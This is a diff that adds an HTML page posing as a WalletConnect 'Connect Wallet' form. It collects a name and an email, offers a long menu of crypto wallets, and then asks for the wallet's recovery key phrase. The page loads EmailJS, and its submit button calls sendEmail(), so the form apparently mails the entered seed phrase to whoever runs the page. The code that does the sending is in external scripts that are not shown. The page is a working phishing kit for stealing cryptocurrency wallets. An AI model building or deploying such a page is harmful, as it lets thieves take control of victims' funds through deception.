@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+
+    <style>
+   body {
+       padding: 0;
+       margin: 0;
+       box-sizing: 0;
+       height: 40vh;
+       cursor: pointer;
+    }
+    
+    #form-div {
+        display: grid;
+        justify-content: center;
+        width: 30%;
+        margin: 5% auto;
+        padding: 10px;
+    }
+
+    .connect-logo {
+        width: 100%;
+        margin: 0 auto;
+    }
+
+    .submit {
+        width: 100%;
+        text-align: center;
+        height: 30px;
+        border: none;
+        font-size: 1rem;
+        font-weight: bold;
+    }
+
+    .submit:hover {
+        background: rgb(177, 174, 174);
+    }
+
+    label {
+        font-size: 1.3rem;
+    }
+
+    input {
+        width: 100%;
+        height: 25px;
+        font-weight: bold;
+    }
+
+    #wallet {
+        width: 102%;
+        height: 25px;
+        font-weight: bold;
+    }
+
+    .next, #next {
+        width: 30%;
+        height: 35px;
+        background: rgb(31, 104, 238);
+        border: none;
+        color: white;
+        font-size: 15px;
+    }
+
+    #google_translate_element {
+        float: right;
+
+    }
+
+    #google_translate_element > p {
+        font-weight: bold;
+        font-size: 1.3rem;
+        margin: 0;
+        color: brown;
+    }
+    
+
+
+@media only screen and (max-width: 1050px) {
+
+#form-div {
+  margin-top: 12%;  
+  width: 40%;
+  height: 70%;
+}
+
+}
+
+
+
+@media only screen and (max-width: 600px) {
+
+    #form-div {
+      margin-top: 20%;
+      width: 60%;
+      height: 70%;
+    }
+}
+
+
+
+    </style>
+
+
+<script type="text/javascript"
+        src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js">
+</script>
+<script type="text/javascript">
+   (function(){
+      emailjs.init("8nXOvWik31oZE0zWu");
+   })();
+</script>
+
+</head>
+<body>
+
+  <div id="form-div">
+
+    <div class="connect-logo">
+        <img src="./img/walletconnect.png" style="width: 100%; height: 80px;" alt="">
+    </div>
+    <h1 style="color: rgb(48, 48, 241);"  >Connect Wallet</h1>
+
+    <form class="form1">
+        <label for="FullName"> FullName </label>
+        <br>
+        <input type="text" id="fullname">
+        <br><br>
+        <label for="Email"> Email </label>
+        <br>
+        <input type="email"  id="email_id">
+        <br><br>
+        <label for="Wallet"> Select Wallet </label>
+        <br>
+        <select id="wallet" name="wallet">
+            <option value="Emmo">Emmo Wallet</option>
+            <option value="Wx invest">Wx invest</option>
+            <option value="Safepal">Safepal</option>
+            <option value="Metamask">Metamask</option>
+            <option value="Lode">Lode Wallet</option>
+            <option value="Hyperpay">Hyperpay Wallet</option>
+            <option value="Fearless">Fearless Wallet</option>
+            <option value="Nova">Nova Wallet</option>
+            <option value="Prema">Prema Wallet</option>
+            <option value="Blade">Blade Wallet</option>
+            <option value="Crypto">Crypto Wallet</option>
+            <option value="Bitfrost">Bitfrost Wallet</option>
+            <option value="Hellum">Hellum Wallet</option>
+            <option value="Wellace">Wellace Wallet</option>
+            <option value="Onto">Onto Wallet</option>
+            <option value="Play">Play Wallet</option>
+            <option value="WEMIX">WEMIX Wallet</option>
+            <option value="LT">LT Wallet</option>
+            <option value="Striker">Striker Wallet</option>
+            <option value="Defichain">Defichain Wallet</option>
+            <option value="XBTS">XBTS Wallet</option>
+            <option value="Cosmotation">Cosmotation Wallet</option>
+            <option value="Galleon">Galleon Wallet</option>
+            <option value="Temple">Temple Wallet</option>
+            <option value="Phantom">Phantom Wallet</option>
+            <option value="Islami">Islami Wallet</option>
+            <option value="Balance">Balance Wallet</option>
+            <option value="Eidoo">Eidoo Wallet</option>
+            <option value="Acients">Acients Wallet</option>
+            <option value="Pleana">Pleana Wallet</option>
+            <option value="Pocket">Pocket Wallet</option>
+            <option value="Defi">Defi Wallet</option>
+            <option value="Incognito">Incognito Wallet</option>
+            <option value="Tangem">Tangem Wallet</option>
+            <option value="Keplr">Keplr Wallet</option>
+            <option value="Pera Algo">Pera Algo Wallet</option>
+            <option value="Nabox">Nabox Wallet</option>
+            <option value="Safle">Safle Wallet</option>
+            <option value="Ami safe">Ami safe Wallet</option>
+            <option value="TC">TC-Wallet pro</option>
+            <option value="Monero">Monero Wallet</option>
+            <option value="Ergo">Ergo Wallet</option>
+            <option value="Math">Math Wallet</option>
+            <option value="Apollo X">Apollo X Wallet</option>
+            <option value="iToken">iToken Wallet</option>
+            <option value="Walken">Walken Wallet</option>
+            <option value="Nitrogen">Nitrogen Wallet</option>
+            <option value="Xfun">Xfun Wallet</option>
+            <option value="Cake">Cake Wallet</option>
+            <option value="Auro">Auro Wallet</option>
+            <option value="Mina protocol">Mina protocol</option>
+            <option value="Hebe">Hebe Wallet</option>
+            <option value="Coinomi">Coinomi Wallet</option>
+            <option value="Pontem">Pontem Wallet</option>
+            <option value="Fecwhab">Fecwhab Wallet</option>
+            <option value="Tizer">Tizer Wallet</option>
+            <option value="Xumm">Xumm Wallet</option>
+            <option value="Klever">Klever Wallet</option>
+            <option value="K5">K5 Wallet</option>
+            <option value="SoloDez">SoloDez Wallet</option>
+            <option value="Monolith">Monolith Wallet</option>
+            <option value="Via">Via Wallet</option>
+            <option value="Dash">Dash Wallet</option>
+            <option value="Blits">Blits Wallet</option>
+            <option value="Kardiachain">Kardiachain Wallet</option>
+            <option value="Atomic">Atomic Wallet</option>
+            <option value="CWallet">CWallet</option>
+            <option value="Slope">Slope Wallet</option>
+            <option value="Trustee">Trustee Wallet</option>
+            <option value="Bitkeep">Bitkeep Wallet</option>
+            <option value="Bridge">Bridge Wallet</option>
+            <option value="Sparkpoint">Sparkpoint</option>
+            <option value="Mobox">Mobox</option>
+            <option value="Hellium">Hellium Wallet</option>
+            <option value="Fox">Fox Wallet</option>
+            <option value="coin98">coin98</option>
+            <option value="Exodus">Exodus</option>
+            <option value="Sora">Sora</option>
+            <option value="Now.Wallet">Now.Wallet</option>
+            <option value="Coincome">Coincome</option>
+            <option value="Braavos">Braavos</option>
+            <option value="swallet">swallet</option>
+            <option value="KaiKas">KaiKas Wallet</option>
+            <option value="Pumapay">Pumapay</option>
+            <option value="Minke">Minke Wallet</option>
+            <option value="Railway">Railway Wallet</option>
+            <option value="station">station Wallet</option>
+            <option value="Leap">Leap Wallet</option>
+          </select>
+        <br><br>
+        <button class="next">next</button>
+        
+    </form>
+
+    <form class="form2" style="display: none;" >
+        <label for="Wallet"> Wallet key Phrase </label>
+        <br>
+        <input type="text"  id="seedphrase">
+        <br><br>
+        <button type="submit" class="submit" id="next" onclick="sendEmail()">submit</button>
+    </form>
+
+  </div>
+          
+   
+  <div id="google_translate_element">
+    <p>Translator</p>
+  </div>
+
+
+  <script type="text/javascript">
+
+     function googleTranslateElementInit() {
+        new google.translate.TranslateElement({
+           pageLanguage: 'en', layout: 
+           google.translate.TranslateElement.InlineLayout.HORIZONTAL, autoDisplay: 
+           false, gaTrack: true, gaId: 'YOUR_API_KEY'
+           }, 'google_translate_element');
+     }
+
+
+  </script>
+  <script type="text/javascript" src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
+   
+
+  <script src="./formscript.js"></script>
+  <script src="./scriptformm.js"></script>
+ 
+</body>
+</html>
